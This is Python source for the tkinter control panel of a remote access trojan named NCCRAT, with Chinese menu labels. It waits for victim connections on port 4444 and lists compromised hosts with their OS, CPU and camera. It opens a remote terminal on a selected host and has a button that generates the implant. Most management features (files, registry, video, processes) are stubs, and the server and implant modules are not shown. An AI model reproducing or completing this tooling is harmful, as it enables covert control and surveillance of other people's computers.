import tkinter as tk
from tkinter import ttk, Menu, Toplevel, messagebox, scrolledtext
from server import RAT_SERVER
import threading
from generate_client_demo import generate_client
from terminal import Terminal

class ratGUI:
    def __init__(self, root, server: RAT_SERVER):
        self.root = root
        self.server = server
        self.server.on_client_connected = self.add_client_to_table
        self.server.on_client_disconnected = self.remove_client_from_table
        self.root.title("RAT")
        self.create_menu()
        self.create_toolbar()
        self.create_table()
        self.create_status_bar()
        self.create_log()

        # 等待连接
        self.start_connection_thread()
        self.current_client = None

    def create_menu(self):
        menu_bar = Menu(self.root)
        self.root.config(menu=menu_bar)

        # 菜单示例
        file_menu = Menu(menu_bar, tearoff=0)
        file_menu.add_command(label="退出", command=self.root.quit)
        menu_bar.add_cascade(label="菜单(F)", menu=file_menu)
        
        # 帮助菜单
        help_menu = Menu(menu_bar, tearoff=0)
        help_menu.add_command(label="关于", command=lambda: messagebox.showinfo("关于NCCRAT", "这是一个RAT管理工具的GUI界面。"))
        menu_bar.add_cascade(label="帮助(H)", menu=help_menu)
        


    def create_toolbar(self):
        toolbar = tk.Frame(self.root, bd=1, relief=tk.RAISED)

        # 工具按钮
        buttons = [
            ("终端管理", self.terminal_management),
            ("进程管理", self.process_management),
            ("窗口管理", self.window_management),
            ("桌面管理", self.desktop_management),
            ("文件管理", self.file_management),
            ("语言管理", self.language_management),
            ("视频管理", self.video_management),
            ("服务管理", self.service_management),
            ("注册表管理", self.registry_management),
            ("参数设置", self.settings),
            ("生成服务端", self.generate_server),
            ("帮助", self.help)
        ]
        for (text, command) in buttons:
            btn = tk.Button(toolbar, text=text, relief=tk.FLAT,
                            padx=5, pady=2, command=command)
            btn.pack(side=tk.LEFT, padx=2, pady=2)

        toolbar.pack(side=tk.TOP, fill=tk.X)

    def create_table(self):
        columns = ("IP", "端口", "计算机名/备注", "操作系统", "CPU", "摄像头", "PING")
        self.tree = ttk.Treeview(self.root, columns=columns, show="headings")
        self.tree.pack(fill=tk.BOTH, expand=True)

        # 设置列标题
        for col in columns:
            self.tree.heading(col, text=col)
            self.tree.column(col, width=100, anchor=tk.CENTER)

        # 点击事件
        self.tree.bind("<ButtonRelease-1>", self.on_tree_item_click)

    def create_log(self):
        self.log_frame = tk.Frame(self.root)
        self.log_frame.pack(side=tk.BOTTOM, fill=tk.BOTH, expand=True)
        self.log_text = scrolledtext.ScrolledText(
            self.log_frame, state='disabled', height=10)
        self.log_text.pack(fill=tk.BOTH, expand=True)

    def on_tree_item_click(self, event):
        selected_item = self.tree.selection()[0]
        item_values = self.tree.item(selected_item, "values")
        ip = item_values[0]
        port = item_values[1]
        # 切换当前客户端
        self.current_client = self.server.get_client(ip, port)

    def add_client_to_table(self, ip, addr):
        self.tree.insert("", tk.END, values=(
            ip, addr, "未知", "未知", "未知", "未知", "未知"))
        self.client_num += 1
        self.status_bar.config(text=f"有{self.client_num}个主机在线")
        self.log_message(f"主机{ip}已连接")

    def remove_client_from_table(self, ip, addr):
        for item in self.tree.get_children():
            item_values = self.tree.item(item, "values")
            if item_values[0] == ip and item_values[1] == addr:
                self.tree.delete(item)
                self.client_num -= 1
                self.status_bar.config(text=f"有{self.client_num}个主机在线")
                self.log_message(f"主机{ip}已断开")
                break

    def log_message(self, message):
        self.log_text.config(state='normal')
        self.log_text.insert(tk.END, message + '\n')
        self.log_text.config(state='disabled')
        self.log_text.yview(tk.END)

    def create_status_bar(self):
        self.client_num = 0
        self.status_bar = tk.Label(
            self.root, text="无主机在线", bd=1, relief=tk.SUNKEN, anchor=tk.W)
        self.status_bar.pack(side=tk.BOTTOM, fill=tk.X)

    def start_connection_thread(self):
        connection_thread = threading.Thread(
            target=self.server.build_connection)
        connection_thread.daemon = True
        connection_thread.start()
        self.log_message("等待客户端连接...")

    def terminal_management(self):
        if self.current_client is None:
            messagebox.showerror("错误", "请先选择一个客户端")
            return
        terminal = Terminal(self.root, *self.current_client)

    def generate_server(self):
        generate_client(self.root)

    def process_management(self):
        messagebox.showinfo("进程管理", "进程管理功能")

    def window_management(self):
        messagebox.showinfo("窗口管理", "窗口管理功能")

    def desktop_management(self):
        messagebox.showinfo("桌面管理", "桌面管理功能")

    def file_management(self):
        messagebox.showinfo("文件管理", "文件管理功能")

    def language_management(self):
        messagebox.showinfo("语言管理", "语言管理功能")

    def video_management(self):
        messagebox.showinfo("视频管理", "视频管理功能")

    def service_management(self):
        messagebox.showinfo("服务管理", "服务管理功能")

    def registry_management(self):
        messagebox.showinfo("注册表管理", "注册表管理功能")

    def settings(self):
        messagebox.showinfo("settings", "settings")

    def help(self):
        messagebox.showinfo("帮助", "帮助功能")


if __name__ == "__main__":
    rat = RAT_SERVER("127.0.0.1", 4444)
    root = tk.Tk()
    app = ratGUI(root, rat)
    root.geometry("800x600")
    root.mainloop()
